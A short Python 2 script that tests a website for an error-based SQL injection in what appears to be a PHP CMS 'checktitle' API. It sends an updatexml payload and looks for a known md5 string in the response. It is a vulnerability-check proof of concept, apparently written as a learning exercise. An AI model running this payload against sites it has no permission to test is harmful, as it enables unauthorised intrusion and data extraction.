#! /usr/bin/python
# -*- coding:utf-8 -*-

import requests
import argparse

def urlFormat(url):
	if (not url.startswith('http://')) and (not url.startswith('https://')):
		url = 'http://' + url
	if not url.endswith('/'):
		url = url + '/'
	return url
def checkSql(url):
	#通过md5进行匹配注入
	payload = 'index.php?s=member&c=api&m=checktitle&id=13&title=123&module=news,(select (updatexml(1,concat(0x5e24,(md5("xq17")),0x5e24),1)))c,admin'
	url_r = url + payload
	try:
		response = requests.get(url_r)
		#取文本内容 unicode型数据
		if '5ce1f216b70ef3cd03b8db6988aa1b' in response.text:
			print "========================"
			print "Found SQL vulnerability"
		else:
			print "============================"
			print "SQL injection may be patched"
	except Exception as e:
		print "error:",e

def main():
	#学习argparse库
	parser = argparse.ArgumentParser()
	parser.add_argument('-v',action='version',version='version test!')
	parser.add_argument('url',help='website scanned')
	args = parser.parse_args()
	if (args.url is not True):
		url =  urlFormat(args.url)
		checkSql(url)
if __name__ == '__main__':
	main()